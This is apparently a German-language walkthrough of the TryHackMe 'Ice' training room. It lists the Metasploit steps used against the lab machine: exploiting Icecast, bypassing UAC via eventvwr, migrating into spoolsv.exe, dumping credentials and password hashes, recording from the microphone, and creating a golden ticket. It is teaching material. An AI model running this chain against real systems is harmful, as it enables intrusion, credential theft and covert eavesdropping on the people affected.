<html><head><style>body {
   color: black;
}
</style></head><body><h1 id="tryhackme-room-ice">TRYHACKME ROOM ICE</h1>
<p><img src="src/1.png" alt=""></p>
<p>Launching scan against target machine.</p>
<p>Icecast wird auf Port 8000 ausgeführt</p>
<p>NMAP identifiziert DARK-PC als Hostnamen für den Computer</p>
<p>Für Antworten der Nummern #1 und #2 des Task 3 des Rooms ICE braucht man folgende Liste <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-693/product_id-1194/Icecast-Icecast.html">https://www.cvedetails.com/vulnerability-list/vendor_id-693/product_id-1194/Icecast-Icecast.html</a></p>
<p><img src="src/2.png" alt=""></p>
<blockquote>
<p>Search Icecast</p>
</blockquote>
<p>Returnt alle target exploits für den Zielcommand (ICECAST)</p>
<p>Nachdem wir das module ice zur Verwedung gewählt haben (use icecast / use 0) geben wir uns mit show options die Optionen des Moduls ausgeben. Hierbei ist RHOSTS das einzig leere Feld, welches noch nicht gesetzt ist. (RHOST ist die deployte VM (10.10.79.188))</p>
<blockquote>
<p>getuid</p>
</blockquote>
<p>Der Icecast Prozess wurde von dem User Dark ausgeführt.</p>
<blockquote>
<p>Sysinfo</p>
</blockquote>
<p>Returnt Systeminfos</p>
<blockquote>
<p>Background</p>
</blockquote>
<p>Um den jetztig laufenden Prozess in den Background geben</p>
<p>Dann wird mit</p>
<blockquote>
<p>use exploit/windows/local/bypassuac_eventvwr</p>
</blockquote>
<p>der exploit gesetzt.</p>
<p>Nachdem wir uns die options angesehen haben wird die Session mit</p>
<blockquote>
<p>set session 1</p>
</blockquote>
<p>die Session gesetzt.</p>
<blockquote>
<p>Run
Options</p>
</blockquote>
<p>Uns fällt auf, dass der LHOST noch falsch ist (sollte ip von Openvpn Verbindung sein)</p>
<blockquote>
<p>Ip addr
Set LHOST <strong>IP</strong>
Run
Sessions 2</p>
</blockquote>
<p>Die Session id wird beim run-Befehl ausgegeben</p>
<p>Mit dem Befehl &quot;getprivs&quot; können wir nun überprüfen, ob wir die Berechtigungen erweitert haben.</p>
<p><img src="src/3.png" alt=""></p>
<p>Mit</p>
<blockquote>
<p>Ps</p>
</blockquote>
<p>werden die Prozesse aufgelistet.</p>
<p>Mit</p>
<blockquote>
<p>migrage -N spoolsv.exe</p>
</blockquote>
<p>migriert man zu diesem Prozess</p>
<blockquote>
<p>creds_all</p>
</blockquote>
<p>listet alle Anmeldedaten auf</p>
<p>Mit welchem ​​Befehl können wir alle auf dem System gespeicherten Passwort-Hashes sichern?</p>
<p>Mit</p>
<blockquote>
<p>hashdump</p>
</blockquote>
<p>Wie wäre es, wenn wir von einem am System angeschlossenen Mikrofon aufnehmen wollten?</p>
<blockquote>
<p>Record_mic</p>
<p>Golden_ticket_create</p>
</blockquote>
<p>Erstellt ein golden Ticket, mit dem wir uns überall problemlos authentifizieren können.</p>
</body></html>